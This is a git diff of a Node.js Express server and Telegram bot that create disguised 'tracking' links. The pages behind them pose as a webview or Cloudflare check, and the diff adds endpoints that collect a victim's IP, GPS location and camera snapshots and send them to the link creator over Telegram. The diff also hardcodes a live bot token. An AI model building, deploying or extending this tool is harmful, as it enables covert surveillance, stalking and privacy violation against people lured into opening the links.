@@ -5,11 +5,12 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
-require('dotenv').config(); // Load environment variables
 
-const botOwnerId = process.env.BOT_OWNER_ID;
-const botToken = process.env.BOT_TOKEN;
+// Directly add your bot token and owner id here
+const botOwnerId = '1249726999';  // Replace with your actual bot owner id
+const botToken = '6464738786:AAH0QO_mP2Pvtz94Lwxc0FCgJUHaCrjBlaw';  // Replace with your actual bot token
 const bot = new TelegramBot(botToken, { polling: true });
+
 const jsonParser = bodyParser.json({ limit: '20mb', type: 'application/json' });
 const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' });
 const app = express();
@@ -20,30 +21,30 @@ app.use(urlencodedParser);
 app.use(cors());
 app.set("view engine", "ejs");
 
-const hostURL = "https://37uhgpn4xca9k.ahost.marscode.site/"; // Use your host URL
+// Rest of the code remains unchanged...
+
+
+const hostURL = "https://sgtrackerbot-5wkncn8u.b4a.run/";
 let use1pt = false;
 
-// Base64 encode/decode replacements for Node.js
-function encodeBase64(data) {
-    return Buffer.from(data).toString('base64');
-}
-
-function decodeBase64(data) {
-    return Buffer.from(data, 'base64').toString('ascii');
-}
-
-// GET route for '/w/:path/:uri'
 app.get("/w/:path/:uri", (req, res) => {
     let ip;
-    let d = new Date().toJSON().slice(0, 19).replace('T', ':');
+    let d = new Date();
+    d = d.toJSON().slice(0, 19).replace('T', ':');
 
-    ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
+    if (req.headers['x-forwarded-for']) {
+        ip = req.headers['x-forwarded-for'].split(",")[0];
+    } else if (req.connection && req.connection.remoteAddress) {
+        ip = req.connection.remoteAddress;
+    } else {
+        ip = req.ip;
+    }
 
-    if (req.params.path) {
+    if (req.params.path !== null) {
         res.render("webview", {
             ip: ip,
             time: d,
-            url: decodeBase64(req.params.uri),
+            url: atob(req.params.uri),
             uid: req.params.path,
             a: hostURL,
             t: use1pt
@@ -53,18 +54,24 @@ app.get("/w/:path/:uri", (req, res) => {
     }
 });
 
-// GET route for '/c/:path/:uri'
 app.get("/c/:path/:uri", (req, res) => {
     let ip;
-    let d = new Date().toJSON().slice(0, 19).replace('T', ':');
+    let d = new Date();
+    d = d.toJSON().slice(0, 19).replace('T', ':');
 
-    ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
+    if (req.headers['x-forwarded-for']) {
+        ip = req.headers['x-forwarded-for'].split(",")[0];
+    } else if (req.connection && req.connection.remoteAddress) {
+        ip = req.connection.remoteAddress;
+    } else {
+        ip = req.ip;
+    }
 
-    if (req.params.path) {
+    if (req.params.path !== null) {
         res.render("cloudflare", {
             ip: ip,
             time: d,
-            url: decodeBase64(req.params.uri),
+            url: atob(req.params.uri),
             uid: req.params.path,
             a: hostURL,
             t: use1pt
@@ -74,7 +81,6 @@ app.get("/c/:path/:uri", (req, res) => {
     }
 });
 
-// Function to animate edited messages
 async function animatedEditMessage(chatId, messageId, newText) {
     const words = newText.split(' ');
     const wordsPerEdit = 10;
@@ -103,7 +109,6 @@ async function animatedEditMessage(chatId, messageId, newText) {
     }
 }
 
-// Get user details and send to owner
 async function getUserDetails(user) {
     const userDetails = `
         User Name: ${user.first_name} ${user.last_name || ""}
@@ -111,17 +116,13 @@ async function getUserDetails(user) {
         User ID: ${user.id}
     `;
 
-    if (user.photo && user.photo.total_count > 0) {
-        try {
-            const photoFile = await bot.getUserProfilePhotos(user.id, 0, 1);
-            const photoUrl = await bot.getFileLink(photoFile.photos[0][0].file_id);
-            return { userDetails, photoUrl };
-        } catch (error) {
-            console.error('Error fetching profile photo:', error);
-            return { userDetails };
-        }
+    if (user.photo) {
+        const photoFile = await bot.getUserProfilePhotos(user.id, 0, 1);
+        const photoUrl = await bot.getFileLink(photoFile.photos[0][0].file_id);
+        return { userDetails, photoUrl };
+    } else {
+        return { userDetails };
     }
-    return { userDetails };
 }
 
 function sendUserDetailsToOwner(userDetails) {
@@ -132,7 +133,6 @@ function sendUserDetailsToOwner(userDetails) {
     }
 }
 
-// Send help message to the user
 async function sendHelpMessage(chatId) {
     const helpMessage = `
     Welcome to the bot! Here are some steps to get started:
@@ -144,12 +144,13 @@ async function sendHelpMessage(chatId) {
     await bot.sendMessage(chatId, helpMessage);
 }
 
-// Bot message listener
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
 
     try {
         const isMember = await bot.getChatMember("@SG_Modder1", msg.from.id);
+        const isAdmin = await bot.getChatMember("@SG_Modder1", msg.from.id);
+        const isChannelAdmin = isAdmin && (isAdmin.status === "creator" || isAdmin.status === "administrator");
 
         if (isMember && isMember.status !== "left") {
             if (msg?.reply_to_message?.text === "🔖 Drop your URL here:") {
@@ -181,6 +182,9 @@ bot.on('message', async (msg) => {
                 const tutorialLink = "https://t.me/SG_Modder1/140";
                 await bot.sendMessage(chatId, `Watch the tutorial video here: ${tutorialLink}`);
             }
+        } else if (isChannelAdmin) {
+            if (msg.text === "/admin_command") {
+            }
         } else {
             bot.sendMessage(chatId, "To use this bot, please join @SG_Modder1 channel.", {
                 reply_markup: JSON.stringify({
@@ -196,19 +200,16 @@ bot.on('message', async (msg) => {
     }
 });
 
-// Callback query handler
-bot.on('callback_query', async (callbackQuery) => {
-    try {
-        await bot.answerCallbackQuery(callbackQuery.id);
-        if (callbackQuery.data === "crenew") {
-            createNew(callbackQuery.message.chat.id);
-        }
-    } catch (error) {
-        console.error('Callback error:', error);
+bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
+    bot.answerCallbackQuery(callbackQuery.id);
+    if (callbackQuery.data === "crenew") {
+        createNew(callbackQuery.message.chat.id);
     }
 });
 
-// Function to shorten URLs using SmolUrl
+bot.on('polling_error', (error) => {
+});
+
 async function shortenUrlWithSmolUrl(url) {
     try {
         const apiUrl = 'https://smolurl.com/api/links';
@@ -218,12 +219,12 @@ async function shortenUrlWithSmolUrl(url) {
                 'Accept': 'application/json',
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({ url }),
+            body: JSON.stringify({ url }), // send the URL in the request body
         });
 
         if (response.ok) {
             const data = await response.json();
-            return data.data.short_url;
+            return data.data.short_url; // return the shortened URL from the response
         } else {
             throw new Error('Failed to shorten URL with SmolUrl');
         }
@@ -233,12 +234,12 @@ async function shortenUrlWithSmolUrl(url) {
     }
 }
 
-// Function to create tracking links
+
 async function createLink(cid, msg) {
     const encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
     if ((msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) && !encoded) {
-        const url = cid.toString(36) + '/' + encodeBase64(msg);
+        const url = cid.toString(36) + '/' + btoa(msg);
         const m = {
             reply_markup: JSON.stringify({
                 "inline_keyboard": [
@@ -260,31 +261,93 @@ async function createLink(cid, msg) {
     🎉 Your link has been created successfully! Here's your tracking URL:
     ✅ Original URL: ${msg}
 
-    🚀 URL to Track IPs via CloudFlare:
-    ${smolCUrl}
+    🚀 URL to Track:
+    🌍 Whole World Support:
+        ${smolCUrl}
 
-    🚀 URL to Track IPs via WebView:
-    ${smolWUrl}
-            `, m);
-        } catch (error) {
-            console.error('Error creating tracking link:', error);
-            bot.sendMessage(cid, "An error occurred while creating the link. Please try again.");
+    🌍 Whole World Support:
+        ${smolWUrl}
+
+    🔍 These links are your tools for tracking purposes. Utilize them responsibly and ethically to gather the information you need. For any inquiries or assistance, feel free to reach out. 🛠️
+    Stay informed, stay responsible!
+    🕵️‍♂️ = @SG_Modder
+    `, m);
+           } catch (error) {
+            console.error('Error shortening links:', error);
+            bot.sendMessage(cid, `Failed to shorten links. Please try again later.`);
         }
     } else {
-        bot.sendMessage(cid, "🔖 Drop your URL here:");
+        bot.sendMessage(cid, `❌❌❌Please Enter a valid URL, including http or https.`);
+        createNew(cid);
     }
 }
 
-// Function to create new link
-async function createNew(cid) {
-    bot.sendMessage(cid, "🔖 Drop your URL here:");
+function createNew(cid) {
+    const mk = {
+        reply_markup: JSON.stringify({ "force_reply": true })
+    };
+    bot.sendMessage(cid, `🔖 Drop your URL here:`, mk);
 }
 
-// Error handling
-bot.on("polling_error", console.error);
+app.get("/", (req, res) => {
+    let ip;
+    if (req.headers['x-forwarded-for']) {
+        ip = req.headers['x-forwarded-for'].split(",")[0];
+    } else if (req.connection && req.connection.remoteAddress) {
+        ip = req.connection.remoteAddress;
+    } else {
+        ip = req.ip;
+    }
+    res.json({ "ip": ip });
+});
 
-// Server initialization
+app.post("/location", (req, res) => {
+    const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
+    const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
+    const uid = decodeURIComponent(req.body.uid) || null;
+    const acc = decodeURIComponent(req.body.acc) || null;
+    if (lon !== null && lat !== null && uid !== null && acc !== null) {
+        bot.sendLocation(parseInt(uid, 36), lat, lon);
+        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+        res.send("Done");
+    }
+});
+
+app.post("/", (req, res) => {
+    const uid = decodeURIComponent(req.body.uid) || null;
+    let data = decodeURIComponent(req.body.data) || null;
+    if (uid !== null && data !== null) {
+        data = data.replaceAll("<br>", "\n");
+        bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
+        res.send("Done");
+    }
+});
+
+app.post("/camsnap", (req, res) => {
+    const uid = decodeURIComponent(req.body.uid) || null;
+    const img = decodeURIComponent(req.body.img) || null;
+    if (uid !== null && img !== null) {
+        const buffer = Buffer.from(img, 'base64');
+        const info = {
+            filename: "camsnap.png",
+            contentType: 'image/png'
+        };
+        try {
+            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
+        } catch (error) {
+            console.log(error);
+        }
+        res.send("Done");
+    }
+});
+bot.on('polling_error', console.log);
+//  Error handler
+app.use((req, res, next) => {
+    res.status(404).send("Page not found.");
+});
+
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
-    console.log(`Server started on port ${port}`);
+    console.log(`Server is running on port ${port}`);
 });
+//Join My Telegram Channel @SG_Tracker1
